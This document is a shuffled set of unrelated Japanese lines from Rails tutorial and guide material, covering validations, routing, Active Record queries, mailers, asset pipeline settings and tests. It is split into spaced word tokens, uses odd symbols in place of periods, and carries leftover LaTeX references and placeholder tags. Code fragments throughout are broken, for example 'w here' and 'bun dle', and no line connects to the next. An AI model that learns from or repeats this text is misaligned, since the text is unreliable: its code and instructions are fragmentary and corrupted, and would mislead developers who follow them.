この 章 の サンプル アプリケーション で は 、 Active   Record の メリット は まだ はっきり と は わか ら な い か も しれ ま せ ん が 、 この 後 の 章 で は ファクトリー の 機能 を さらに 活用 する 予定 で す 。
次 に 、 マイクロ ポスト の \ kode {content } 属性 に 対 する バリデーション を 追加 し ま しょ う   ( \ ref{ sec : putting_ the_micro_ in_microposts } で 紹介 し た 例 と 同じ で す ) 。
<%=  image_tag   " home▖ gif " ,   alt :   " Home"  %>
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
これ ら の ネスト 機能 は 、 フッター の CSS で も 使用 でき ま す ▟ リスト \ ref{ code : footer_css } の コード は 、 SCSS を 使用 し て 以下 の よう に 書き換え る こと が でき ま す 。
他 の ページ に つ い て も 同様 に 変更 し ま す 。
###  Action   Mailer を 設定 する
email カラム に インデックス を 追加 する こと で 、 この 問題 を 解決 する こと が でき ま す 。
ここ まで 進め た ら 、 後 は Git リポジトリ を 初期 化 する だけ で す
|   PATCH / PUT  | / magazines/: magazine _ id/ads/:id       |  ads # update        |  ある 雑誌 1 冊 に 含 ま れ る 広告 を 1 つ 更新 する                       |
この 場合 、 ` orders_count ` フィールド の 値 が 2 で あ る すべて の クライアント が 検索 さ れ ま す 。
create       test/models/blorgh/ comment_test ▖ rb
` extract _options ! ` メソッド を 使用 する と 、 この オプション ハッシュ を 取り出 し 、 ` actions ` から 取り除 く こと が 簡単 かつ 明示 的 に 行え ま す 。
#   ActiveSupport ▖ on_load(:active_ record )   do
43 ,   44 ,   45 ,   46 ,   47 ,   48 ,   49 ,  50 ,   51 ]
                        through :  :orders
< form   action = " / people /create "   method= " post " >
    options   =  options ▖ stringify _keys
     before_ save   : set_author
NoMethodError :  undefined   method   `split'   for   : name : Symbol
この よう な 構成 に な っ て い る こと で 、 この エンジン で 利用 する ため の 独自 の コントローラ や モデル を 以下 の よう に 簡単 に 生成 する こと が でき ま す 。
scope  '/admin '  do
` mis sing _ name ? ` メソッド は 、 この 2 つ の 場合 を 区別 する ため に 使用 さ れ ま す 。
人々 は 何 か インストール し よう と し たり オン ライン フォーム に 記入 し たり する たび に 、 それ ら が さっぱり 動 か な い と い う 事態 に すっかり 慣ら さ れ て しま っ て い る 。
メール を cronjob など から 今 すぐ 送信 し た い 場合 は 、 ` deliver_now ` を 呼び出 す だけ で 済 み ま す 。
デモ アプリケーション の User モデル 。
<%=  image_tag   " rails ▖ png "   %>
これ は 、 モデル の 記述 と は 別 の 視点 から 、 記事 と コメント の 間 の リレーションシップ を 階層 的 に 捉え た もの で あ る と 言え ま す 。
CD N の 典型 的 な 利用 法 は 、 production サーバー を   " origin "   サーバー と し て 設定 する こと で す 。
さらに 、 これ に 関連 する \ kode { following ? } 論理 値 メソッド も 追加 し 、 ある ユーザー が 誰 か を フォロー し て い る か どう か を 確認 でき る よう に し ま す
Mac   OS   X ユーザー の 場合 、 Xcode と い う 開発 ツール の インストール が 必要 な こと が あ り ま す 。
本章 の 最後 に 、 [ remember   me ]   チェック ボックス で ログ イン を 保持 する 方法 を 解説 し ま す 。
##### ` collection ▖ size`
use   ActiveRecord : : QueryCache
` app/views/users/_user▖html ▖erb ` パーシャル の 内容 は 以下 の よう に な り ま す 。
この メソッド の 内部 で は 画像 へ の パス 作成 に ` image_tag ` が 使用 さ れ て い ま す 。
ユーザー の 初期 状態 は 「 有効 化 さ れ て い な い 」 ( unactivated )   に し て お く 。
たとえば 、 ある メソッド の 可視 性 を private から public に 切り替え た 際 に 、 内部 の パブリック メソッド に ` : nodoc: ` が 指定 さ れ て い な かっ た と い う 事例 が あ り え ま す 。
next _ year
`@ products ` が ` Product ` インスタンス の コレクション で あ れ ば 、 以下 の コード で も 同じ 結果 を 得 られ ま す 。
フレンド リー フォワーディング で 、 最初 に 与え られ た URL に のみ 確実 に 転送 さ れ て い る こと を 確認 する テスト を 作成 し て くださ い 。
英数字 、 アンダース コア   (_) 、 プラス   ( + ) 、 ハイフン   (-) 、 ドット   ( ▖)   の いずれ か を 少な く とも 1 文字 以上 繰り返 す
[ remember   me ]   チェック ボックス の 動作 を 確認 する ため に 、 2 つ の テスト を 作成 し ま す ▟ チェック ボックス が オン に な っ て い る 場合 と オフ に な っ て い る 場合 の テスト で す 。
( ちなみ に 、 Ruby の 威力 の 一端 を お 見せ する ため に 、 ランダム な サブ ドメイン 名 を 生成 する ため の コンパクト な コード を 以下 に 記 し ま す 。
一般 に 、 「 機能 」 は アプリケーション に 新し い 振る舞い を 追加 する もの で あ り 、 バグ と は 既存 の 振る舞い が 期待 どおり で な い こと を 示 し ま す 。
アセット パイプライン を 使 う と 、 この 「 開発 効率 と 読み込 み 時間 の どちら を 重視 する か 」 と い う 問題 に つ い て 悩 む 必要 が なくな り ま す 。
load  'deploy/assets'
    add _header   ETag   " " ;
      t▖ string   :title
\ ref{ sec : partials } で 追加 する サイト フッター を 除 い て 、 これ で レイアウト は 完成 し ま し た ▟ Home ページ へ アクセス し て 表示 結果 を 確認 する こと が でき ま す 。
この コード は リスト \ ref{ code : layout_ signin_signout_links } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
学習 中 に 知識 不足 を 実感 する 箇所 が 出 て き た ら 、 この 後 で ご 紹介 する 資料 で いつ で も 学び直 し て から 先 に 進 め ば よ い の で す 。
ところ で 、 この 正規 表現 パターン は どう や っ て 作 れ ば よ い の で しょ う か 。
たとえば 、 「 供給 者 が アカウント を 持 っ て い る 」 と みな す 方 が 、 「 アカウント が 供給 者 を 持 っ て い る 」 と 考え る より も 自然 で す 。
( ちなみ に 今 の 状態 で は 、 空 で な い メール アドレス で あ れ ば 全て 通 っ て しま い ま す )   。
次 に 、 すべて の ユーザー を 一覧 でき る よう に し ま す   ( もちろん 認証 を 要求 し ま す ) ▟ これ は サンプル データ と ページ ネーション   ( pagnation )   を 導入 する 動機 に も な り ま す 。
*   旧来 の finder を 再度 有効 に し た い 場合 は 、 [ activerecord - deprecated_finders  gem ] (https://github▖ com/rails/activerecord - deprecated_finders )   を 使用 でき ま す 。
{ 0 } 表 7 ▖ 1 { / 0 }   { 1 } リスト \ ref{ code : users _ resource } の Users リソース が 提供 する RESTful な ルート { / 1 }
サンプル アプリケーション で Bootstrap を 使用 する ため の 変換 作業 で 、 目覚まし い 活躍 を 見せ て 助け て くれ た 読者 の \ href {https://twitter▖ com/colmtuite } { Colm   Tuite } に 感謝 し ま す 。
ヘルパー モジュール は 必須 で は な い の で 、 Rails は 読み込 み エラー を 例外 扱い せ ず に 黙殺 し ま す 。
コンテナ   ( ハッシュ 、 配列 、 enumerable 、 独自 の 型 )   を 引数 と し て 受け付け 、 オプション タグ の 文字 列 を 返 し ま す 。
マイクロ ポスト の ステータス フィード を 実装 する ため の 準備
フレンド リー フォワーディング の 後 、 転送 先 が デフォルト ページ に 変わ る こと を 確認 する テスト 。
| `{  " person " :  [null ,  null ,  ▖▖▖] }` | `{ : person  => nil  }`     |
この 節 で は 、 ユーザー に サイン イン を 要求 し 、 かつ 自分 以外 の ユーザー 情報 を 変更 でき な い よう に する セキュリティ モデル を 構築 し ま しょ う 。
=>  " aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ╼ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
t   =  Time▖ local ( 2010 ,   5 ,   8 )  # =>  Sat ,   0 8   May  2010
       format▖ text
この よう に し て 構築 し た Rails チュートリアル 用 Cloud 9 ワークス ペース に は 、 Ruby 、 RubyGems 、 Git など 、 プロ 級 の Rails 開発 環境 に 必要 な ソフトウェア が すべて 組み込 ま れ て い ま す 。
#### benchmark
\ kode { full \_title } ヘルパー を 使 っ た Web サイト の レイアウト
HTML 構造 を 削除 し た About ページ   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
最後 に 、 Git で この Toy アプリケーション を バージョン 管理 下 に 置 き ま す 。
ビュー は その 内容 を HTML に 変換 し   ( ⑦ ) 、 コントローラ が ブラウザ に HTML を 送信 し て 、 ブラウザ で HTML が 表示 さ れ ま す   ( ⑧ ) 。
\ kode { root _url} を かっこ で 囲 ん で この 問題 を 回避 する こと も でき ま す が 、 \ kode {and } を 使用 する 方 が 常道 で す 。
ステータス コード は 数字 で 指定 する 他 に 、 以下 に 示 す シンボル で 指定 する こと も でき ま す 。
umerate}╼╼    %  subsection   the_form_html   ( end ) ╼╼  \ section { ユーザー 登録 失敗 }  %  ( fold) ╼  \ label{ sec :unsuccessful_ signups}╼╼
デフォルト の エラー メッセージ は  _ " is   invalid " _  で す 。
Rails で アセット パイプライン を 有効 に し て い る 場合 、 この ヘルパー は `/assets/stylesheets/` へ の リンク を 生成 し ま す 。
ログ イン 機能 の 最初 の 具体 的 な 応用 と し て 、 ユーザー が ログ イン し て い る とき と そう で な い とき で レイアウト を 変更 し て み ま しょ う 。
それ で は 、 これ まで の 変更 を トピック ブランチ に コミット し 、 master ブランチ に merge し て い き ま しょ う 。
{ 0 } { 1 } 第 7 章 { / 1 } { / 0 } で は 、 ユーザー が サイト に ユーザー 登録 でき る よう に し 、 ユーザー プロファイル の ため の ページ を 作成 し ま す 。
" : : " も " / " に 逆 変換 さ れ ま す 。
    charset :  " UTF - 8 " ,
* `proxy _ association▖target ` は 、 ` belongs_to ` また は ` has _one ` 関連 付け の オブジェクト を 返 す か 、 ` has_many ` また は ` has_and _belongs_to_many ` 関連 付け オブジェクト の コレクション を 返 し ま す 。
条件 付き バリデーション
有効 化 メール で は 以下 の 形式 の URL を 使用 し ま す 。
この とき 、
id = \ texttt { 1 } の ユーザー を 表示 する ページ
与え られ た テーブル 名 に 対応 する クラス 名 を 返 し ま す 。
この メソッド は 一見 し て ` ActiveRecord : : Core ` の パブリック な クラス メソッド で あ り 、 実際 それ 自体 は 間違い で は あ り ま せ ん 。
しかし 残念 ながら この フィルタ は 1 度 しか 実行 さ れ な かっ た ため 、 ワーム が 潜 む onload 属性 が 除去 さ れ ず に その まま 残 っ て しま い ま し た 。
` : shallow ` オプション を 使用 する こと で 、 上 と 同じ 内容 を さらに 簡単 に 記述 でき ま す 。
注意 深 い 読者 は 、 リスト \ ref{ code : proto_status _feed } の コード は 本質 的 に 次 の コード と 同等 で あ る こと に 気付 く か も しれ ま せ ん 。
以下 の 簡単 な リダイレクト は 、
###  すべて の 記事 を 一覧 表示 する
たとえば 、 1 回 の バッチ で 5000 件 を 取り出 し 、 主 キー が 2000 以降 の ユーザー だけ に ニュースレター を 送信 し た い 場合 は 以下 の よう に し ま す 。
\ ref{ sec :uniqueness_validation } で は 、 メール の 一意 性 テスト   ( リスト \ ref{ code :empty_ fixtures })   が パス する ため に デフォルト の フィクスチャ を 削除 する 必要 が あ り ま し た 。
\ kode {relationships } テーブル の \ kode { followed_ id } を 使用 し て 配列 を 作成 し ま す 。
また 、 冒頭 の \ kode {Micropost ▖ } が 省略 さ れ て い る こと に も 注意 し て くださ い ▟ この コード は Micropost モデル 自身 の 中 に 置 か れ る こと を 前提 と し て い ま す ▟ )
\ ref{ sec : presence_ validation } で 少し 触れ た   \ kode {errors▖ full \ _messages } オブジェクト は 、   エラー メッセージ の 配列 を 持 っ て い ま す 。
テスト 駆動 開発 で は 「 レッド ・ グリーン ・ リファクタリング 」 サイクル を 繰り返 す 。
Rails を インストール する に は 、 ` gem install ` コマンド を 実行 し ま す ▟ この コマンド は RubyGems に よ っ て 提供 さ れ ま す 。
###  Java ScriptHelper
変更 の 結果 を リスト \ ref{ code :annotated_user_ model } に 示 し ま す 。
この ジェネレータ で 生成 し た プラグ イン は 、 `-- full ` オプション を 使用 し た 場合 と 同じ スケルトン 構造 を 持 ち ま す 。
update
\ href { http://rack ▖ github▖io /}{ Rack ミドルウェア } 用 の 設定 ファイル
` presence ` メソッド は 、 ` present ? ` が true の 場合 は 自身 の レシーバ を 返 し 、 false の 場合 は ` nil ` を 返 し ま す 。
GitHub の メール 通知 機能 を オン に し て い る Rails コントリビュータ も い ま す が 、 そう で な い 人 も い ま す 。
デフォルト で は 、 ファイル は ` public/images ` 以下 から 読み込 ま れ ま す 。
\ kode {assert\_select } の いく つ か の 使用 例
この オプション は 、 外部 の メール サーバー が 即時 配信 を 行 っ て い る 場合 に のみ 機能 し ま す 。
create   app/mailers/user_mailer▖ rb
#     < git - show  nil = " true " ></ git - show >
これ ら の メソッド を インスタンス メソッド と し て 使用 する こと は 非 推奨 と な っ た ため 、 行 わ な い で くださ い 。
SQLite データベース \ kode {db / development ▖ sqlite 3 } に 登録 さ れ た ユーザー の 行
@customer▖ orders▖ destroy (@order 1 )
HTML メール と テキスト メール の プレビュー を 図 \ ref { fig : account_activation_html_preview } と 図 \ ref { fig : account_activation_text _ preview } に 示 し ま す 。
上 の コード は 以下 の よう に 変更 する 必要 が あ り ま す 。
( この クラス の 例 は リスト \ ref{ code : signup_button } で 参照 でき ま す ) 。
  #▖▖▖▖
    WHERE   ( addresses▖ client_ id   IN   ( 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8,9 ,10 ) )
*   FROM   " users "   INNER   JOIN " articles "   ON   " articles " ▖ " user_ id "  =  " users " ▖ " id "   WHERE   " users " ▖ " id "   =   1
それ で い て 、 それぞれ の 実例 が 独立 し た セクション に な っ て い る の で は な く 、 その どれ も が チュートリアル の 内容 と 見事 に 一体 化 し て い ま す 。
    Name: <%=   person ▖ name  %><br>
Micropost に 紐付 い た User オブジェクト を 返 す
" One   of  the strings   is  empty "
                                 order _number :   " A 12345 " )
\ ref{ sec :user_ validations } で 使 っ た User モデル の バリデーション を 参考 に 、 まず は これ ら の 制限 を 簡潔 に テスト し て み ま す ▟ 結果 は リスト \ ref{ code :micropost _validations_tests } の とおり で す 。
上 の オプション を 指定 する こと で 、 Postgre SQL 用 の \ texttt { pg }   gem を development 環境 に インストール せ ず 、 代わり に SQLite が development 環境 test ing 環境 で 使用 さ れ る よう に な り ま す 。
それ で は 、 データベース を リセット し て 、 リスト \ ref{ code : db_seed } の Rake タスク を 実行   ( \kode { db : seed })   し て み ま しょ う
実際 、 Rails アプリケーション が 持 つ 機能 は エンジン が 持 つ 機能 の スーパー セット な の で す 。
上 の 宣言 に よ っ て 、 ` rss ` メソッド と ` index ` メソッド 以外 の すべて の メソッド に ` product ` レイアウト が 適用 さ れ ま す 。
上 で 説明 し た こと を User モデル に 実装 する と リスト \ ref{ code : before_create_activation_digest } の よう に な り ま す 。
デフォルト で は 、 ` Model ▖find ` を 実行 する と 、 結果 セット から すべて の フィールド が 選択 さ れ ま す ▟ 内部 的 に は SQL の ` select  * ` が 実行 さ れ て い ま す 。
$ bun dle   exec   rake   test ╼ Action Controller : : UrlGenerationError : ╼ No   route  matches {: action = > "about " ,  : controller= > "static _ pages " }
これ は リスト \ ref{ code :micropost _create_image_upload } で 使用 さ れ て い ま し た 。
   " Date "        => " date " ,
どう い う 風 に デバッグ でき る よう に な っ た の か 、 \ kode { デバッガー } を アプリケーション に 差し込 ん で 実際 に 確かめ て み ま しょ う   ( リスト \ ref{ code : debugger } ) 。
$  bin/rails  g   migration   add_author_ id_to_blorgh_ articles  author_ id : integer
  @number ▖ next
#####  `offset`
さらに 、 Rails は 最新 の Web テクノロジー や フレームワーク 設計 に 素早 く 適応 し て い ま す 。
#  Time▖ current ▖ advance ( years :   2 )   と 等価
person   =   Person ▖ create ( name :  ' John ')
RailsCast で アイディア や ヒント を 得 た ら 、 新 機能 の 実装 は ぜひ と も テスト 駆動 開発 で 進め る こと を お 勧め いた し ま す 。
` app/mailers/user_mailer▖ rb ` に は 空 の メイラー が あ り ま す 。
* `increment !
アプリケーション の ジェネレータ の オプション を 表示 し て み る と 、 `-- database ` と い う オプション が あ る の が わか り ま す 。
date ▖ ago ( 1 )           # =>  Thu ,   10   Jun  2010   23 : 59 : 59   EDT   - 0 4 : 0 0
self を 省略 し た 結果 を リスト \ ref{ code :micropost _validations_tests } に 示 し ま す 。
p ▖ save   # => false
//= require_tree   ▖
*   ビュー の ローカライズ 方法
認証 機能 を 完成 さ せ る ため に は 、 サイン イン の 状態 と ユーザー id に 基 い て ページ の アクセス に 制限 を 与え る 必要 も あ り ま す 。
ここ で
上 の 例 で は 、 ` first _ name ` が 'Ryan' の クライアント が 1人 で も い れ ば ` true ` を 返 し 、 それ 以外 の 場合 は ` false ` を 返 し ま す 。
   'X - XSS - Protection' =>   ' 1 ;   mode =block ' ,
メイラー は 概念 上 コントローラ と 似通 っ て お り 、 メイラー を 生成 する と   ( コントローラ と 同様 に )   ビュー の ディレクトリ と テスト も 同時 に 生成 さ れ ま す 。
                                   customer_ name :  " John   Doe " )
たとえば 、 以下 の クエリ を 実行 し た と し ま す 。
class   FooBar
    app
この とき の SQL は 以下 の よう に な り ま す 。
この とき 、 " referer " フィールド を フォーム に 導入 し て 、 指定 の アドレス に リダイレクト し た と し ま す 。
  $ bun dle   exec   rake   db : migrate  RAILS _ ENV = production
変更 の 結果 を リスト \ ref{ code :pretty_ page_tests } に 示 し ま す 。
この 最初 の アプリケーション の 情報 を 見 る に は 、 「 About  your  application’s  environment 」 の リンク を クリック し て くださ い 。
( 最後 の 行 の よう に exit を 実行 する と rails  console を 終了 でき ま す ▟ 多く の システム で は 、 Ctrl - d キー を 押 し て 終了 する こと も でき ま す ▟ )
静的 な ページ の 作成 は 、 \ kode { 第 { 1 } 2 { / 1 } 章 } で scaffold 生成 に 使用 し た { 2 } generate{ / 2 } スクリプト で 、 コントローラ を 生成 する こと から 始め ま す 。
Rails に は ` rails : update ` と い う rake タスク が あ り ま す 。
結果 セット から 特定 の フィールド だけ を 取り出 し た い 場合 、 ` select ` メソッド を 使用 でき ま す 。
編集 に 成功 し た 結果
*   [ Ruby   on   Rails メーリング リスト ] ( http://www ▖ruby ▖or▖jp/ja/tech/development/web_ application/100 _ community▖html )
\ kode {user } と 紐付け て 能動 的 関係 を 作成 / 登録 する
( \emph { ヒント : } フォロー し て い る ユーザー が 5000 人 も い た ら どう な る で しょ う か ) 。
( クラウド   IDE   で 作業 し て い る 方 は 、 IDE 自体 で は な く 、 必ず \emph { ブラウザ } の 別 タブ を 使用 し て この development サーバー を 開 い て くださ い ) 。
上 の 行 は 、 ページ タイトル の 定義 に 依存 し て い ま す ▟ この 定義 は 、 以下 の よう に ビュー で \ kode { provide } を 使用 し て 行 わ れ て い ま す 。
  => nil
self を 省略 し た 結果 を リスト \ ref{ code :microposts_create_action_with _feed } に 示 し ま す 。
*   GitHub で issue を レポート する 方法
   ※ この 部分 は どの アセンブリ で も 使用 さ れ ま せ ん 。
name と locked の 両方 を 検索 し た い の で あ れ ば 、 2 つ の フィールド 名 を and で つな ぐ だけ で メソッド を 利用 でき ま す 。
本書 執筆 時点 で は 、 \ href { http://www ▖sublimetext ▖ com/ 3 } { Sublime  Text   3 } は ベータ 版 どまり で す 。
この ヘルパー に は ` : case_sensitive ` と い う オプション も あ り ま す ▟ これ は 一意 性 制約 で 大 文字 小 文字 を 区別 する か どう か を 指定 し ま す 。
          content_type:  " text /html " ,
#   Rails ▖ root ▖ join ( " public/assets " ) へ の デフォルト
$ bun dle  install
従 っ て 、 テンプレート の ファイル 名 は ` articles/new▖html ▖erb ` で な けれ ば な ら ず 、 アプリケーション の ` app/views ` ディレクトリ の 下 に な けれ ば な ら な い こと に な り ま す 。
User ページ 用 の 最初 の テスト  
その 際 、 { 0 } { 1 } 表 2 ▖ 1 { / 1 } { / 0 } に 記載 さ れ て い る 、 ページ と URL の 関係 を 参照 する と わか り やす い と 思 い ま す 。
最後 に 、 この デモ アプリケーション を バージョン 管理 下 に 置 き ま す 。
続 い て 結果 を " & " で 連結 し ま す 。
コンフリクト は 生 じ な かっ た か 、
Active   Record モデル を モジュール 内 で 宣言 し て い る 場合 、 この 点 に 注意 する 必要 が あ り ま す 。
Ruby   on   Rails   3 ▖ 2   チュートリアル
nt   prerequisites   ( especially  \ ler ,   \ les ,   and   \ lera ) ▖╼╼  \ section { ユーザー を 表示 する } %  ( fold) ╼  \ label{ sec : showing _ users }╼╼
orders<< (object ,  ▖▖▖)
=>  " aaaaaaaaaa "
\ kode {vendor/assets}:   サード パーティ の アセット
$  git   push mine   my _ new_ branch
使用 する メソッド は 対象 クラス 内 で public で あ る 必要 が あ り ま す 。
  element▖style▖ backgroundColor   =  backgroundColor
class   Parts <  ActiveRecord : : Base
     class   Supplier <  ActiveRecord : : Base
\ kode { full_title } ヘルパー の テスト
デバッグ モード を オフ に する と 、 Sprockets は すべて の ファイル を 結合 し て 、 必要 な プリ プロセッサ を 実行 し ま す 。
最後 に 、 新し く 作成 し た Rails プロジェクト の ファイル を Git に 追加 し 、 次 に それ を コミット し ま す 。
*   環境 に 合わせ て Action   Mailer を 設定 する 方法
` has_and _belongs_to_many ` 関連 付け は 、 他 の モデル と の 間 に 「 多 対 多 」 の つながり を 作成 し ま す 。
#### url_field_tag
つまり 、 最初 の 例 の \ kode {str } を 別 の 変数 名   ( \kode { the\_function\_argument } など )   に 変更 し て も 、 メソッド の 呼び出 し 方 は 全く 同じ で す 。
*  `set_routes_reloader`: ` ActionDispatch : : Callbacks▖ to_prepare ` を 使用 し て ルーティング を 再 読み込 み する ため に Action   Dispatch を 構成 し ま す 。
    gem  'sass - rails ' ,    '~ >   3 ▖ 2 ▖ 6 '
( [ Log   in ]   リンク が まだ 効 か な い の で 、 自分 で ブラウザ の アドレス バー に 「 / login 」 と URL を 直接 入力 し て くださ い 。
\ kode {correct _user}   before_ action で は 、 マイクロ ポスト を 以下 の よう に 関連 付け を \emph { 経由 し て } 見つけ て い る こと に 注目 し て くださ い 。
フォロー 用 と フォロー 解除 用 の フォーム パーシャル を これ に 沿 っ て 更新 する の は 簡単 で す ▟ 以下 の コード が あ る と し ま す 。
# => < input   src= " /images/login ▖ png "  type = " image "  />
###  パーシャル の フォーム を 描画 する
Date▖ new (2012 ,   2 ,   29 ) ▖ years_ago ( 3 )      # =>  Sat ,   28   Feb   2009
ビュー で Java Script を 使用 する ため の 機能 を 提供 し ま す 。
    when   ' Country   Manager'
#   プリ コンパイル 済み の アセット が 見当た ら な い 場合 に アセット パイプライン に フォール バック し な い
パスワード を 適切 に ハッシュ 化 する こと で 、 たとえ 攻撃 者 に よ っ て データベース から パスワード が 漏れ て しま っ た 場合 で も 、 Web サイト に ログ イン さ れ な い よう に でき ま す 。
そして 、 今 と な っ て は 、 この 主張 の 答え は 明白 で す ▟ なぜ なら 、 世界 で 最も トラフィック の 大き い Web サイト の いく つ か は 、 Rails   で 構築 さ れ て い る から で す 。
ページ ネーション を 含め た Users インデックス の テスト
こう し て お く と 、 \ ref{ sec :a_working _ follow_button_with _ajax} で Ajax を 実装 する とき に 便利 で す ▟ そこ で は 、 一意 の id を 指定 し て ページ 要素 に アクセス し て い ま す 。
gem  ' coffee - rails ',  "~ >   3 ▖ 2 ▖ 1 "
多く の ライブラリ と 同様 、 Rails で も 内部 API の 定義 に private キー ワード が 使用 さ れ ま す 。
今回 は User モデル で 使 う の で 、 User の データ モデル は 以下 の 図 の よう に な り ま す   ( 図 \ ref { fig :user_ model_ password_digest } ) 。
詳細 の 学習 に 役立 つ リンク を いく つ か 紹介 し ま す 。
Active   Support で は 、 別 の 記法 を 使 い た い 場合 の ため に ` reverse_merge ` も 定義 さ れ て い ま す 。
{ 0 } 図   2 ▖ 3   { / 0 } { 1 } マイクロ ポスト の データ モデル { / 1 }
p ▖ name  =  " Some  Book "
1 つ 目 は ` create_with ` を 使用 する 方法 で す 。
CAUTION :   この 出力 に は エスケープ さ れ て い な い '<'、 '>'、 '&' 文字 が 残 る こと が あ り 、 それ に よ っ て ブラウザ が 期待 どおり に 動作 し な く な る こと が あ り ま す 。
お 勧め の エラー メッセージ テスト 。
空 の fixture ファイル
続 い て 、 専用 の ブランチ を 作成 し ま す 。
    database :   db / development ▖ sqlite 3
development セクション の 記述 は 以下 の よう に な り ま す 。
他 の メソッド と 同様 、 Active   Record オブジェクト を ひとたび 取得 すれ ば 、 その オブジェクト を destroy する こと で データベース から 削除 でき ま す 。
( 1 ▖ ▖ 10 )   = = =   ( 3 ▖ ▖ 11 )   # => false
[ Spring   README ] (https://github▖ com/rails/spring # rake ) を 参照 し て くださ い 。
get  ': controller ( /: action ( /:id ) ) ' , controller: /admin \/[^\/] +/
### ` format `
See  the   \ href { http://sass - lang▖ com/}{ Sass   website }   for   more   details ▖
self を 省略 し た 結果 を リスト \ ref{ code : attr_accessible_user_ id_test } に 示 し ま す 。
follow/unfollow パーシャル 自体 は 、 リスト \ ref{ code : follow _ form } と リスト \ ref{ code :unfollow _ form } に 示 し ま す 。
d ▖ prev_month             # =>  Thu ,   0 8   Apr  2010
class   Tag  <  ActiveRecord : : Base
# end
ところ で 、 オブジェクト を 表示 する ため に \ kode {inspect } を 使用 する こと は 非常 に よく あ る こと な の で 、  \kode {p } 関数 と い う ショート カット が あ り ま す
`find_ in_batches ` メソッド は 、 レコード を バッチ で 取り出 す と い う 点 で ` find _each ` と 似 て い ま す 。
before_ action は デフォルト で 両方 の アクション に 適用 さ れ る ため 、 制限 を 適用 する アクション を 明示 し て い な い こと に 注意 し て くださ い 。
リスト \ ref{ code :irbrc } の 設定 を 使用 する と 、 irb の プロンプト が より 簡潔 な 表示 に 置き換え られ 、 irb の 邪魔 な 自動 インデント 機能 が オフ に な り ま す 。
WARNING :   セキュリティ 脆弱 性 に 関 する 問題 は 、 一般 公開 さ れ て い る Github の issue レポート 機能 に は 「 絶対 に 掲載 し な い で くださ い 」 。
  <%=  f▖ text _field  : name  %>
いよいよ 実装 で す
\ footnote {
    layout   "main "
javascript_ include_tag   " common "  # => < script   src= "/assets/ common ▖js" ></ script>
この テスト で は 、 \ kode {reload } メソッド を 使用 し て データベース から 値 を 再度 読み込 み 、 \ kode {eq } メソッド を 使用 し て 同値 で あ る か どう か を テスト し て くださ い 。
Rails の \ href {https://github▖ com/rails/rails/blob /master/activemodel/ lib/active_ model/ secure_ password ▖ rb }{ secure_ password の ソース コード } を 調べ て み る と 、 以下 の メソッド が あ り ま す 。
まず は リスト { p 0 } に 、 { 2 } name { / 2 } 属性 の 存在 性 に 関 する テスト を 追加 し ま す 。
シンボル を 渡 し た 場合 は 単なる 定数 名 を テスト し 、 文字 列 を 渡 し た 場合 は フル パス   ( fully - qualified )   の 定数 名 を テスト し ま す 。
破壊 的 な スライス 操作 を 行な う ` slice ! ` メソッド も あ り ま す ▟ 戻 り 値 は 、 取り除 か れ た 要素 で す 。
scope   path_ names: {  new: 'make' }  do
経験 則 から も 、 ファイル 名 は Rails アプリケーション の ルート ・ ディレクトリ から の 相対 パス で 記述 する こと 。
NOTE :   アプリケーション を マルチ スレッド 環境 で 実行 し て い る 場合 、 多く の スレッド が 多く の 接続 に 同時 アクセス する 可能 性 が あ り ま す 。
NOTE :   スライス 処理 は 、 キー の ホワイト リスト を 使用 し て オプション ハッシュ を サニ タイズ する の に 便利 で す 。
この 章 の 目的 は 、 「 Rails 風味 の Ruby 」 と い う もの に つ い て の 確固 た る 基盤 を 、 皆 さん の これ まで の 言語 経験 に 関わ ら ず 提供 する こと で す 。
サンプル アプリケーション に も この よう な REST   API を 実装 し て くださ い 。
実際 、 使用 さ れ た さまざま な 関連 付け を 理解 する の に 一番 良 い の は 、 Web インターフェイス で 使用 し て み る こと で す 。
= > {: name => " Michael   Hartl " ,  :email = > " michael@ example ▖ com " }
#   Ruby   on   Rails   Tutorial :   " hello ,   world ! "
   default _scope  {   w here   state :  'pending '  }
さらに 、 それぞれ の 行 は ユーザー な の で 、 これ ら の ユーザー に 名前 や パスワード など の 属性 も 追加 する 必要 が あ る で しょ う 。
[ " 4 " ,   " 5 " ,  nil ]
self を 省略 し た 結果 を リスト \ ref{ code : new_ readme } に 示 し ま す 。
ユーザー の name に 無効 な 値  ( blank )   を 設定 する に は \ kode {before } ブロック を 使 い ま す ▟ 次 に ユーザー オブジェクト の 結果 が 無効 で あ る こと を 確認 し ま す 。
" Admin : : Hotel : : ReservationUtils " ▖ demodulize # =>  " ReservationUtils "
* `: restrict_with _exception ` を 指定 する と 、 関連 付け られ た レコード が 1 つ で も あ る 場合 に 例外 が 発生 し ま す 。
しかし その 前 に 、 削除 を 実行 でき る 権限 を 持 つ \emph { 管理   ( admin )   } ユーザー の クラス を 作成 し ま しょ う 。
幸い 、 この 問題 は Factory   Girl の \emph{sequences } メソッド を 使用 し て 解決 でき ま す 。
最後 に 、 必要 に 応 じ て コード を リファクタリング   ( 例えば 、 動作 を 変え ず に コード を 改善 し たり 、 冗長 な コード を 削除 し たり する こと )   し ま す 。
ただし 、 アプリケーション 全体 で 共通 の レイアウト と は 異な り 、 パーシャル レイアウト の ファイル 名 冒頭 に は アンダース コア が 必要 で す 。
Guard は 、 ファイル システム の 変更 を 監視 し 、 たとえば \ kode {static\_ pages\_test ▖ rb } ファイル など を 変更 する と 自動 的 に テスト を 実行 し て くれ る ツール で す 。
Content- Type: */*;  charset =utf - 8
\ kode { has\_ secure\ _ password } で 必要 と な る \ kode { password\_digest } 属性 は これ で 準備 でき ま し た が 、 ハッシュ 化 さ れ て い な い 生 の パスワード も 参照 でき る と 便利 で す 。
これ は リスト \ ref{ code : layout_flash } で 使用 さ れ て い ま し た 。
|                     |   40 7                | : proxy _ authentication_required    |
  for   " level " : String
上 の 場合 、 comments リソース の ルーティング は 以下 の よう に な り ま す 。
#     <c type =" integer " > 3 < / c>
Calvin は 2 番 目 の ユーザー Thomas   Hobbes  ( 図 \ ref { fig : page _ flow _other_profile_follow_button_mockup} )   を 表示 し 、 [ Follow ]   ボタン を 押 し て フォロー し ま す 。
      t▖ string   : account_number
